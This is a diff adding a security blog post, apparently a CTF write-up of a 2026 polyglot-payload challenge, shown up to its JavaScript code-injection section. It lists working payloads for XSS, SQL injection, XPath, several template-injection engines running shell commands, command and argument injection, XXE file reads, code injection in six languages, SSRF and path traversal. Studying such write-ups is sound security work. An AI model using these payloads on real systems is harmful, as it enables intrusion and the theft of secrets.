@@ -1,0 +1,572 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>LeHack 2026 - Payload PLZ Reloaded | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="LeHack 2026 - Payload PLZ Reloaded" />
+  <meta name="description" content="Another year, another great challenge from YesWeHack. It was the same rules as last year, find the shortest polyglot payload that triggers in the maximum contexts, but this time we had 22 contexts ins…" />
+  <meta property="og:description" content="Another year, another great challenge from YesWeHack. It was the same rules as last year, find the shortest polyglot payload that triggers in the maximum contexts, but this time we had 22 contexts instead of the 13 of 2025. More than enough to melt my brain again 🤯" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/payload-plz-reloaded/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2026-06-28T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/LeHACK2026/payloadplzreloaded.png" />
+  <meta property="og:image:alt" content="LeHack 2026 - Payload PLZ Reloaded" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="713" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">LeHack 2026 - Payload PLZ Reloaded</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2026-06-28T00:00:00+00:00">2026-06-28</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H14M0S">14&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/LeHACK2026/payloadplzreloaded.png"
+      alt="LeHack 2026 - Payload PLZ Reloaded"
+      width="1200"
+      height="713"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#challenges">Challenges</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#xss-1">XSS 1</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#xss-2">XSS 2</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#sql-injection-1">SQL Injection 1</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#sql-injection-2">SQL Injection 2</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#xpath-injection">XPath Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#jinja-ssti">Jinja SSTI</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#brainfuck">Brainfuck</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#erb-ssti">ERB SSTI</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#twig-ssti">Twig SSTI</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#smarty-ssti">Smarty SSTI</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#command-injection-1">Command Injection 1</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#command-injection-2">Command Injection 2</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#argument-injection">Argument Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#xxe">XXE</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#python-code-injection">Python Code Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#javascript-code-injection">JavaScript Code Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#ruby-code-injection">Ruby Code Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#php-code-injection">PHP Code Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#lua-code-injection">Lua Code Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#perl-code-injection">Perl Code Injection</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#ssrf">SSRF</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#path-traversal">Path Traversal</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#polyglot">Polyglot</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#conclusion">Conclusion</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#side-note">Side Note</a>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><p>Another year, another great challenge from YesWeHack. It was the same rules as last year, find the shortest polyglot payload that triggers in the maximum contexts, but this time we had 22 contexts instead of the 13 of 2025. More than enough to melt my brain again 🤯.</p>
+<span id="continue-reading"></span>
+<p>The scoring formula was:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>score = (number of challenges solved * 1000) - payload length</span></span></code></pre>
+<p>That made the challenge a balancing act between coverage and size. A long payload that solved more contexts was not always better than a shorter one, and every separator mattered because the same byte was parsed as SQL, XML, HTML, shell, template syntax, Brainfuck, URL text, filesystem path, and source code in several languages.</p>
+<h2 id="challenges">Challenges</h2>
+<p>The payload was built by first solving each parser in isolation, then merging fragments that were harmless or useful in the other contexts. This section documents the raw challenge context for each task and the standalone input that solves it before any polyglot constraints are applied.</p>
+<table><thead><tr><th>Context language</th><th>Payload</th></tr></thead><tbody>
+<tr><td>XSS 1</td><td><code>&lt;script&gt;alert(flag)&lt;/script&gt;</code></td></tr>
+<tr><td>XSS 2</td><td><code>'; alert(flag); //</code></td></tr>
+<tr><td>SQLi 1</td><td><code>' UNION SELECT flag, NULL, NULL FROM flag --</code></td></tr>
+<tr><td>SQLi 2</td><td><code>0 UNION SELECT flag, NULL, NULL FROM flag</code></td></tr>
+<tr><td>XPath Injection</td><td><code>[\"]|*?</code></td></tr>
+<tr><td>Jinja SSTI</td><td><code>{{ lipsum.__globals__["os"].popen('env').read() }}</code></td></tr>
+<tr><td>Brainfuck</td><td><code>[.&gt;],[.,]</code></td></tr>
+<tr><td>ERB SSTI</td><td><code>&lt;%= ENV['FLAG'] %&gt;</code></td></tr>
+<tr><td>Twig SSTI</td><td><code>{{['env']|filter('system')}}</code></td></tr>
+<tr><td>Smarty SSTI</td><td><code>{system('env')}</code></td></tr>
+<tr><td>Command Injection 1</td><td><code>';env;#</code></td></tr>
+<tr><td>Command Injection 2</td><td><code>";env;#</code></td></tr>
+<tr><td>Argument Injection</td><td><code>a -o -exec printenv FLAG {} +</code></td></tr>
+<tr><td>XXE</td><td><code>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///dev/shm/flag.txt'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;</code></td></tr>
+<tr><td>Python</td><td><code>"; print(__import__('os').environ['FLAG']); x="</code></td></tr>
+<tr><td>JavaScript</td><td><code>"; console.log(process.env.FLAG); const x="</code></td></tr>
+<tr><td>Ruby</td><td><code>"; puts ENV['FLAG']; x="</code></td></tr>
+<tr><td>PHP</td><td><code>"; echo getenv('FLAG'); $x="</code></td></tr>
+<tr><td>Lua</td><td><code>"; print(os.getenv('FLAG')); local x="</code></td></tr>
+<tr><td>Perl</td><td><code>"; print $ENV{FLAG}; my $x="</code></td></tr>
+<tr><td>SSRF</td><td><code>127.0.0.1/flag</code></td></tr>
+<tr><td>Path Traversal</td><td><code>/../../../../dev/shm/flag.txt</code></td></tr>
+</tbody></table>
+<p>The following subsections, will have a short explanation for each context and a bit more details when the payload could be shorten or merged with another context. Jump to the <a href="https://swisskyrepo.github.io/blog/payload-plz-reloaded/#polyglot">Polyglot</a> section if you only care about the tips and tricks used in the final payload.</p>
+<h3 id="xss-1">XSS 1</h3>
+<p><strong>Description</strong>: execute JavaScript in a Chromium page where input is injected inside an HTML heading. The winning condition is <code>alert(flag)</code>.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="html"><span class="giallo-l"><span>&lt;</span><span style="color: #85E89D;">h1</span><span>&gt;Hello $INPUT&lt;/</span><span style="color: #85E89D;">h1</span><span>&gt;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="html"><span class="giallo-l"><span>&lt;</span><span style="color: #85E89D;">script</span><span>&gt;</span><span style="color: #B392F0;">alert</span><span>(flag)&lt;/</span><span style="color: #85E89D;">script</span><span>&gt;</span></span></code></pre>
+<p>In the final payload this became an SVG event handler because it was shorter and also worked for the second XSS context after closing the script tag.</p>
+<h3 id="xss-2">XSS 2</h3>
+<p><strong>Description</strong>: execute JavaScript in a Chromium page where input is injected inside a single-quoted JavaScript string in a script block. The winning condition is <code>alert(flag)</code>.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="html"><span class="giallo-l"><span>&lt;</span><span style="color: #85E89D;">script</span><span>&gt;</span><span style="color: #F97583;">const</span><span style="color: #79B8FF;"> x</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &#39;$INPUT&#39;</span><span style="color: #F97583;">&lt;/</span><span>script</span><span style="color: #F97583;">&gt;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="javascript"><span class="giallo-l"><span style="color: #9ECBFF;">&#39;; alert(flag); /</span><span style="color: #FDAEB7;font-style: italic;">/</span></span></code></pre>
+<p>The polyglot version instead used <code>&lt;/script&gt;&lt;svg onload=alert(flag)&gt;</code>, which avoids needing a JavaScript-line comment that would interfere with other parsers.</p>
+<p>ℹ️ In HTML context, the <code>&lt;script&gt;</code> tag is allowed to fail, you can have as much garbage as you want in it. If you close the context and open a new one, the Javascript code will not be impacted by the garbage before.</p>
+<h3 id="sql-injection-1">SQL Injection 1</h3>
+<p><strong>Description</strong>: extract the flag from a SQLite <code>flag</code> table. The input is normalized with NFKC before being inserted into a quoted string.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="sql"><span class="giallo-l"><span style="color: #F97583;">SELECT * FROM</span><span> users </span><span style="color: #F97583;">WHERE</span><span> username </span><span style="color: #F97583;">=</span><span style="color: #9ECBFF;"> &#39;$INPUT.normalize(&quot;NFKC&quot;)&#39;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="sql"><span class="giallo-l"><span style="color: #9ECBFF;">&#39; UNION SELECT flag, NULL, NULL FROM flag --</span></span></code></pre>
+<p>The important merge trick was replacing the ASCII quote with <code>＇</code>, which normalizes to <code>'</code> only in the SQLi 1 context.</p>
+<p>ℹ️ Refer to last year blog post for the NFKC table: <a rel="external" href="https://swisskyrepo.github.io/blog/payload-plz/#sql-1-and-sql-2">payload-plz/#sql-1-and-sql-2</a></p>
+<h3 id="sql-injection-2">SQL Injection 2</h3>
+<p><strong>Description</strong>: extract the flag from SQLite, this time from an unquoted numeric context.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="sql"><span class="giallo-l"><span style="color: #F97583;">SELECT * FROM</span><span> users </span><span style="color: #F97583;">WHERE</span><span> age </span><span style="color: #F97583;">&gt;</span><span> $INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="sql"><span class="giallo-l"><span style="color: #79B8FF;">0</span><span style="color: #F97583;"> UNION SELECT</span><span> flag, </span><span style="color: #F97583;">NULL</span><span>, </span><span style="color: #F97583;">NULL FROM</span><span> flag</span></span></code></pre>
+<p>This context forced the final payload to begin with a valid numeric SQL expression. That requirement is the core reason XXE could not be merged into the final 20/22 payload. More on this in the Polyglot section.</p>
+<h3 id="xpath-injection">XPath Injection</h3>
+<p><strong>Description</strong>: extract the password of the <code>admin</code> user from an XML document where the query initially checks the <code>guest</code> user.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>//user[name/text()=&quot;guest&quot; and password/text()=&quot;$INPUT&quot;]/name/text()</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>[\&quot;]\|*?</span></span></code></pre>
+<p>Same as last year, thank you. I hate XPATH 💔</p>
+<h3 id="jinja-ssti">Jinja SSTI</h3>
+<p><strong>Description</strong>: exploit a Jinja2 template injection where the flag is available in the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>Hello $INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>{{ lipsum.__globals__[&quot;os&quot;].popen(&#39;env&#39;).read() }}</span></span></code></pre>
+<p>The merged payload used <code>lipsum.__globals__.os.environ</code> to expose the environment while sharing syntax with Twig.</p>
+<h3 id="brainfuck">Brainfuck</h3>
+<p><strong>Description</strong>: Provide a valid Brainfuck program that outputs the flag. The flag is split into two parts: the first half is stored in memory starting at address <code>0</code>, and the second half is available on stdin. Invalid Brainfuck commands are removed. The runner has a maximum of <code>10 * 1000</code> operations.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>$INPUT.replace(/[^&gt;&lt;+\-.,\[\]]/g, &quot;&quot;)</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>[.&gt;],[.,]</span></span></code></pre>
+<p>This was one of the easiest fragments to embed because all other parser syntax is ignored by the Brainfuck sanitizer.</p>
+<p>ℹ️ You can put it anywhere in your payload, and then ask Claude to fix whatever failed. I chose to put around the start of the polyglot, because the "," character from the SQL injection and the "&lt;" character from the XSS would break it. All the characters below are valid brainfuck instructions.</p>
+<table><thead><tr><th>Character</th><th>Instruction Performed</th></tr></thead><tbody>
+<tr><td><code>&gt;</code></td><td>Increment the data pointer by one, to point to the next cell to the right.</td></tr>
+<tr><td><code>&lt;</code></td><td>Decrement the data pointer by one, to point to the next cell to the left. Undefined if at 0.</td></tr>
+<tr><td><code>+</code></td><td>Increment the byte at the data pointer by one modulo 256.</td></tr>
+<tr><td><code>-</code></td><td>Decrement the byte at the data pointer by one modulo 256.</td></tr>
+<tr><td><code>.</code></td><td>Output the byte at the data pointer.</td></tr>
+<tr><td><code>,</code></td><td>Accept one byte of input, storing its value in the byte at the data pointer.</td></tr>
+<tr><td><code>[</code></td><td>If the byte at the data pointer is zero, then instead of moving the instruction pointer forward to the next command, jump it forward to the command after the matching <code>]</code> command.</td></tr>
+<tr><td><code>]</code></td><td>If the byte at the data pointer is nonzero, then instead of moving the instruction pointer forward to the next command, jump it back to the command after the matching <code>[</code> command.</td></tr>
+</tbody></table>
+<h3 id="erb-ssti">ERB SSTI</h3>
+<p><strong>Description</strong>: exploit a Ruby ERB template injection where the flag is available in the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="erb"><span class="giallo-l"><span>Hello $INPUT!</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="erb"><span class="giallo-l"><span>&lt;%=</span><span style="color: #79B8FF;"> ENV</span><span>[</span><span style="color: #9ECBFF;">&#39;FLAG&#39;</span><span>] %&gt;</span></span></code></pre>
+<p>ℹ️ The final payload used <code>&lt;%=ENV.to_h%&gt;</code> because printing the whole environment satisfied the oracle and was easier to merge with the surrounding bytes.</p>
+<h3 id="twig-ssti">Twig SSTI</h3>
+<p><strong>Description</strong>: exploit a Twig SSTI in sandbox mode where the flag is stored in the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="twig"><span class="giallo-l"><span>Hello $INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="twig"><span class="giallo-l"><span>{{[</span><span style="color: #9ECBFF;">&#39;env&#39;</span><span>]</span><span style="color: #F97583;">|</span><span>filter(</span><span style="color: #9ECBFF;">&#39;system&#39;</span><span>)}}</span></span></code></pre>
+<p>The final payload shared the expression shape with Jinja and used <code>map('system')</code> as the Twig execution primitive.</p>
+<h3 id="smarty-ssti">Smarty SSTI</h3>
+<p><strong>Description</strong>: exploit a Smarty template injection where the flag is stored in the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>Hello $INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>{system(&#39;env&#39;)}</span></span></code></pre>
+<p>The final payload used <code>{system(env)}</code> and a Smarty comment to hide the Jinja/Twig expression from Smarty.</p>
+<h3 id="command-injection-1">Command Injection 1</h3>
+<p><strong>Description</strong>: execute a command from inside a single-quoted argument to <code>ping</code> and read the flag from the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">ping</span><span style="color: #79B8FF;"> -W 1 -c 1</span><span style="color: #9ECBFF;"> &#39;$INPUT&#39;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">&#39;;env;#</span></span></code></pre>
+<p>The quote exits the ping argument, <code>env</code> prints the flag-bearing environment, and <code>#</code> comments the remaining quote.</p>
+<h3 id="command-injection-2">Command Injection 2</h3>
+<p><strong>Description</strong>: execute a command from inside a double-quoted <code>echo</code> argument and read the flag from the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #79B8FF;">echo -n</span><span style="color: #9ECBFF;"> &quot;Welcome user: </span><span>$INPUT</span><span style="color: #9ECBFF;">&quot;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">&quot;;env;#</span></span></code></pre>
+<p>ℹ️ In the final payload, it was solved with backtick command substitution so that the shell and the code runners disagreed about what the quote was doing.</p>
+<h3 id="argument-injection">Argument Injection</h3>
+<p><strong>Description</strong>: inject arguments into an existing <code>find</code> command built with <code>escapeshellcmd($payload)</code>.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">shell_exec(&quot;find /tmp -type d -name &quot;</span><span style="color: #9ECBFF;"> . escapeshellcmd</span><span>($payload))</span></span></code></pre>
+<p>Input code:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span>$INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">a</span><span style="color: #79B8FF;"> -o -exec</span><span style="color: #9ECBFF;"> printenv FLAG {} +</span></span></code></pre>
+<p>The final payload used <code>-o -exec env ; -name ...</code>, and avoiding literal spaces before that suffix became a major constraint.</p>
+<h3 id="xxe">XXE</h3>
+<p><strong>Description</strong>: read <code>/dev/shm/flag.txt</code> through an XML parser configured with <code>load_dtd=True</code>, <code>no_network=False</code>, and <code>resolve_entities=True</code>.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="xml"><span class="giallo-l"><span>&lt;?</span><span style="color: #85E89D;">xml</span><span style="color: #B392F0;"> version</span><span>=</span><span style="color: #9ECBFF;">&quot;1.0&quot;</span><span>?&gt;</span></span>
+<span class="giallo-l"><span>$INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="xml"><span class="giallo-l"><span>&lt;!</span><span style="color: #F97583;">DOCTYPE</span><span style="color: #79B8FF;"> root</span><span> [&lt;!</span><span style="color: #F97583;">ENTITY</span><span style="color: #79B8FF;"> test</span><span style="color: #F97583;"> SYSTEM </span><span style="color: #9ECBFF;">&#39;file:///dev/shm/flag.txt&#39;</span><span>&gt;]&gt;&lt;</span><span style="color: #85E89D;">root</span><span>&gt;</span><span style="color: #79B8FF;">&amp;test;</span><span>&lt;/</span><span style="color: #85E89D;">root</span><span>&gt;</span></span></code></pre>
+<p>This was solved by an alternate XML-first branch, but not by the final payload because its leading XML structure conflicts with SQLi2.</p>
+<p>ℹ️ Since there is a conflict between SQLi 2 and XXE, only the smallest was kept in the final payload.</p>
+<h3 id="python-code-injection">Python Code Injection</h3>
+<p><strong>Description</strong>: inject Python source into a double-quoted string assignment and print the flag from the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span>value</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;$INPUT&quot;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span style="color: #9ECBFF;">&quot;; print(__import__(&#39;os&#39;).environ[&#39;FLAG&#39;]); x=&quot;</span></span></code></pre>
+<p>The final fallback branch used <code>__import__('os').system('env')</code> because printing the environment was accepted by the oracle.</p>
+<h3 id="javascript-code-injection">JavaScript Code Injection</h3>
+<p><strong>Description</strong>: inject JavaScript source into a double-quoted string assignment and print the flag from <code>process.env.FLAG</code>.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="javascript"><span class="giallo-l"><span style="color: #F97583;">const</span><span style="color: #79B8FF;"> value</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;$INPUT&quot;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="javascript"><span class="giallo-l"><span style="color: #9ECBFF;">&quot;; console.log(process.env.FLAG); const x=&quot;</span></span></code></pre>
+<p>This context was not solved in the final payload because the raw double quote needed to escape Node also escapes the Python, Ruby, PHP, and Perl wrappers too early.</p>
